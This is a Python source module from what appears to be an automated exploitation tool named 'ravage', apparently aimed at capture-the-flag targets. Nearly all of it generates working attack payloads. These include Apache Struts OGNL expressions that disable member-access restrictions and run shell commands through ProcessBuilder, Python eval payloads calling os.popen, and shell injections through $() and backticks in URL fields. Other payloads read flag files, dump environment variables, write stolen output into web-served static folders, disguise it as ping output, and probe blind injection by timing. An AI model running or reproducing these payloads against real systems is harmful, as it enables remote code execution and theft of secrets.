from __future__ import annotations

import json

from ravage.probe_suite_parts.support import _dedupe


_COMMAND_PROOF_FILE_PATHS = (
    "/FLAG",
    "/FLAG.txt",
    "/flag",
    "/flag.txt",
    "/tmp/FLAG",
    "FLAG.txt",
    "FLAG",
    "./FLAG.txt",
    "./FLAG",
    "./flag",
    "./flag.txt",
    "flag.txt",
    "/app/FLAG",
    "/app/FLAG.txt",
    "/app/flag",
    "/app/flag.txt",
    "/usr/src/app/FLAG",
    "/usr/src/app/FLAG.txt",
    "/usr/src/app/flag",
    "/usr/src/app/flag.txt",
    "/srv/app/FLAG",
    "/srv/app/FLAG.txt",
    "/srv/app/flag",
    "/srv/app/flag.txt",
    "/workspace/FLAG",
    "/workspace/FLAG.txt",
    "/workspace/flag",
    "/workspace/flag.txt",
    "/var/www/html/FLAG",
    "/var/www/html/FLAG.txt",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/code/FLAG",
    "/code/FLAG.txt",
    "/code/flag",
    "/code/flag.txt",
    "/opt/app/FLAG",
    "/opt/app/FLAG.txt",
    "/opt/app/flag",
    "/opt/app/flag.txt",
)
_COMMAND_PROOF_DISCOVERY_COMMAND = (
    "for p in $(find / /app /srv /workspace /tmp /var/www /code /opt/app -maxdepth 4 -type f "
    "\\( -iname '*flag*' -o -iname '*proof*' \\) 2>/dev/null | head -20); "
    'do cat "$p" 2>/dev/null; done'
)
_COMMAND_PROOF_FILE_COMMAND = "cat " + " ".join(_COMMAND_PROOF_FILE_PATHS) + " 2>/dev/null"
_COMMAND_PROOF_FILE_COMMAND_NO_REDIRECT = "cat " + " ".join(_COMMAND_PROOF_FILE_PATHS)
_COMMAND_PROOF_COMMANDS = (
    _COMMAND_PROOF_DISCOVERY_COMMAND,
    _COMMAND_PROOF_FILE_COMMAND,
    _COMMAND_PROOF_FILE_COMMAND_NO_REDIRECT,
    "printenv",
    "env",
)
_COMMAND_OUTPUT_CHANNEL_COMMANDS = (
    "printf '2 packets transmitted, %s received, 0%% packet loss\\n' "
    f"\"$({_COMMAND_PROOF_FILE_COMMAND_NO_REDIRECT})\"",
    "printf 'Packets Transmitted: 2, Packets Received: %s, Packet Loss: 0%%\\n' "
    f"\"$({_COMMAND_PROOF_FILE_COMMAND_NO_REDIRECT})\"",
)
_COMMAND_PROOF_BUDGET = 16
_COMMAND_TIMING_EXTRACTION_BUDGET = 600
_COMMAND_TIMING_DELAY_SECONDS = 2
_COMMAND_TIMING_THRESHOLD_MS = 1400
_COMMAND_FILE_DROP_DIRS = (
    "static",
    "./static",
    "/app/static",
    "/srv/app/static",
    "/usr/src/app/static",
    "public",
    "./public",
    "/var/www/html",
)

def _command_url_validator_file_drop_payloads(marker: str) -> list[tuple[str, list[str]]]:
    name = _command_file_drop_name(marker)
    proof_command = (
        "mkdir -p static; "
        "cat flag.txt ./flag.txt /app/flag.txt /app/FLAG.txt /flag.txt /FLAG.txt "
        f"> static/{name} 2>/dev/null"
    )
    payloads: list[tuple[str, list[str]]] = []
    for wrapper in ("$({command})", "`{command}`"):
        payloads.append((f"http://example.com{wrapper.format(command=proof_command)}", [f"/static/{name}"]))
    return payloads

def _ognl_file_drop_payloads(marker: str) -> list[tuple[str, list[str]]]:
    name = _command_file_drop_name(marker)
    payloads: list[tuple[str, list[str]]] = []
    for directory in _COMMAND_FILE_DROP_DIRS:
        command = f"{_COMMAND_PROOF_FILE_COMMAND} > {directory.rstrip('/')}/{name}"
        for payload in _ognl_payload_variants(command):
            payloads.append((payload, _command_file_drop_fetch_paths(directory, name)))
    return payloads

def _ognl_payload_variants(command: str) -> list[str]:
    return _dedupe(
        [
            _ognl_writer_command_payload(command),
            _ognl_command_payload(command),
            _ognl_alt_command_payload(command),
        ]
    )

def _ognl_member_access_prefix() -> str:
    return (
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))"
    )

def _ognl_process_builder_expression(command: str) -> str:
    escaped = command.replace("\\", "\\\\").replace("'", "\\'")
    return (
        f"(#cmd='{escaped}')."
        "(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())"
    )

def _ognl_writer_command_payload(command: str) -> str:
    return (
        "%{"
        + _ognl_member_access_prefix()
        + "."
        + _ognl_process_builder_expression(command)
        + "."
        "(#scanner=new java.util.Scanner(#process.getInputStream()).useDelimiter('\\\\A'))."
        "(#out=(#scanner.hasNext()?#scanner.next():''))."
        "(#resp=@org.apache.struts2.ServletActionContext@getResponse())."
        "(#resp.setContentType('text/plain'))."
        "(#writer=#resp.getWriter())."
        "(#writer.println(#out))."
        "(#writer.flush())"
        "}"
    )

def _ognl_command_payload(command: str) -> str:
    return (
        "%{"
        + _ognl_member_access_prefix()
        + "."
        + _ognl_process_builder_expression(command)
        + "."
        "(#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())"
        "}"
    )

def _ognl_alt_command_payload(command: str) -> str:
    escaped = command.replace("\\", "\\\\").replace("'", "\\'")
    return (
        "%{"
        f"(#cmd='{escaped}')."
        "(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#out=@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))."
        "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().println(#out))"
        "}"
    )

def _json_command_signal_payloads(payloads: dict[str, str]) -> list[tuple[str, str]]:
    preferred_markers = ("-t custom", "; echo", "&& echo", "$(echo", "`echo")
    ordered: list[tuple[str, str]] = []
    for marker_text in preferred_markers:
        for payload, expected in payloads.items():
            if marker_text in payload and (payload, expected) not in ordered:
                ordered.append((payload, expected))
    for payload, expected in payloads.items():
        if (payload, expected) not in ordered:
            ordered.append((payload, expected))
    return ordered[:6]

def _json_command_baseline(field: str) -> str:
    lowered = field.lower()
    if "service" in lowered:
        return "status"
    if "url" in lowered:
        return "http://127.0.0.1/"
    return "127.0.0.1"

def _python_eval_json_command_payload(command: str) -> str:
    expression = "__import__('os').popen(" + json.dumps(command) + ").read()"
    return json.dumps({"script": expression}, separators=(",", ":"))

def _chained_json_eval_proof_commands() -> tuple[str, ...]:
    return (
        _COMMAND_PROOF_FILE_COMMAND,
        _COMMAND_PROOF_FILE_COMMAND_NO_REDIRECT,
        _COMMAND_PROOF_DISCOVERY_COMMAND,
        "printenv",
        "env",
    )

def _command_proof_payloads(signal_payload: str, marker: str) -> list[str]:
    payloads: list[str] = []
    for command in _COMMAND_PROOF_COMMANDS:
        payload = _replace_command_probe(signal_payload, marker, command)
        if payload:
            payloads.append(payload)
    for command in _COMMAND_OUTPUT_CHANNEL_COMMANDS:
        payload = _replace_command_probe(signal_payload, marker, command)
        if payload:
            payloads.extend(_command_output_payload_variants(payload))
    return _dedupe(payloads)

def _command_file_drop_payloads(signal_payload: str, marker: str) -> list[tuple[str, list[str]]]:
    name = _command_file_drop_name(marker)
    payloads: list[tuple[str, list[str]]] = []
    for directory in _COMMAND_FILE_DROP_DIRS:
        command = f"{_COMMAND_PROOF_FILE_COMMAND} > {directory.rstrip('/')}/{name}"
        payload = _replace_command_probe(signal_payload, marker, command)
        if payload:
            payloads.append((payload, _command_file_drop_fetch_paths(directory, name)))
    return payloads

def _command_output_payload_variants(payload: str) -> list[str]:
    variants = [payload]
    for separator in (";", "\n", "%0A"):
        index = payload.find(separator)
        if index > 0:
            variants.append("invalid.invalid" + payload[index:])
            break
    return variants

def _command_file_drop_name(marker: str) -> str:
    safe_parts: list[str] = []
    for char in marker:
        if char.isalnum():
            safe_parts.append(char.lower())
            continue
        safe_parts.append("_")
    safe = "".join(safe_parts)
    return f"ravage_{safe}.txt"

def _command_file_drop_fetch_paths(directory: str, name: str) -> list[str]:
    normalized = directory.strip().lstrip("./")
    if normalized.endswith("static") or "/static" in normalized:
        return [f"/static/{name}"]
    if normalized.endswith("public") or normalized.endswith("www/html"):
        return [f"/{name}"]
    return [f"/static/{name}", f"/{name}"]

def _replace_command_probe(signal_payload: str, marker: str, command: str) -> str:
    replacements = (
        f"echo {marker}",
        f"sleep {_COMMAND_TIMING_DELAY_SECONDS}",
        "true",
    )
    for replacement in replacements:
        if replacement in signal_payload:
            return signal_payload.replace(replacement, command)
    return ""

def _command_timing_payload_pairs(payloads: dict[str, str], marker: str) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    for payload in payloads:
        control = _replace_command_probe(payload, marker, "true")
        timing = _replace_command_probe(payload, marker, f"sleep {_COMMAND_TIMING_DELAY_SECONDS}")
        if control and timing:
            pairs.append((control, timing))
    return _dedupe_pairs(pairs)

def _dedupe_pairs(values: list[tuple[str, str]]) -> list[tuple[str, str]]:
    seen: set[tuple[str, str]] = set()
    result: list[tuple[str, str]] = []
    for value in values:
        if value in seen:
            continue
        seen.add(value)
        result.append(value)
    return result
